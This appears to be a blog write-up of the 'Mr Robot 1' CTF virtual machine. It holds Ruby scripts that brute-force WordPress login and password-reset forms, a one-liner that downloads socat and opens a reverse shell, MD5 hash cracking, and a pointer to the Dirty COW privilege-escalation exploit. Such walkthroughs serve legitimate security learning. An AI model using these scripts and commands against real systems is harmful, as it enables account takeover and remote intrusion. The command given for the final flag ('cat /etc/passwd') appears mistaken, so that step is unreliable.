---
layout: post
tags: [programming, linux, cli, ctf, ruby]
excerpt_separator: "\n\n"
---

Simple writeup about the CTF `Mr Robot 1`. (Root-Me version)

> Based on the show, Mr. Robot.
> This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
> The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

## First flag

- Go to `url`/robots.txt
    - fsocity.dic (wordlist for later)
    - key-1-of-3.txt (first flag)
- Go to `url`/key-1-of-3.txt

> Yeah! You got the first one. You're on the right way! Go on!

## Second flag

- Go to `url`/O to find the `wordpress` page
- Brute force the `lost your password` page using `fsocity.dic`

```ruby
#!/bin/ruby

require 'net/http'
require 'uri'

url = 'http://ctf-root-me.org/wp-login.php?action=lostpassword'
error = 'Invalid username or e-mail'

while (line = gets.chomp)
  puts "trying: #{line}"
  args = { user_login: line }
  doc = Net::HTTP.post(URI.parse(url), URI.encode_www_form(args)).body
  break unless doc =~ /#{error}/
end

puts "=> #{line}"
```

> Elliot

- Clear the wordlist

```bash
cat fsociety.dic | sort | uniq > wordlist.dic
```

- Brute force the `login` page

```ruby
#!/bin/ruby

require 'net/http'
require 'uri'

url = 'http://ctf-root-me.org/wp-login.php'
login = 'Elliot'
error = 'The password you entered for the username'

while (line = gets.chomp)
  puts "Trying: #{line}"
  args = { log: login, pwd: line, 'wp-submit': "Log+In", redirect_to: "https://ctf-root-me.org/wp-admin/" }
  doc = Net::HTTP.post(URI.parse(url), URI.encode_www_form(args)).body
  break unless doc =~ /#{error}/i
end

puts "=> #{login}:#{line}"
```

> ER28-0652 

- Install a `shell` extension to run commands (`WPTerm`)
- Run on the target (reverse shell using `socat`, might change the `ip`/`port`)

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444
```

- Run on your computer (might open a port here to catch the connection)

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
export TERM=xterm
```

- Go to `/home/robot`
- Find the md5 of robot's password

```bash
cat /home/robot/password.raw-md5

robot:c3fcd3d76192e4007dfb496cca67e13b
```

- Crack it using `rockyou` wordlist (personally used `hashcat`)

```
abcdefghijklmnopqrstuvwxyz
```

- Change to `robot` user

```bash
su robot
```

- Cat the `second flag`

```bash
cat key-2-of-3.txt 
```

> Congratz! You got the second key. Try to get the last one ;)

## Third flag

- Run `uname -a`
- Find out that the exploit `Dirty Cow` is possible
- Use the exploit from `https://www.exploit-db.com/exploits/40616`
- Be `root` 🔥
- Cat the `last flag`

```bash
cat /etc/passwd
```

> 86de7bd0d5a7413227ac73d58f7144b4

## Useful links

- [reverse shell](https://www.revshells.com/)
- [simple shell to interactive tty](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [privilege escalation](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)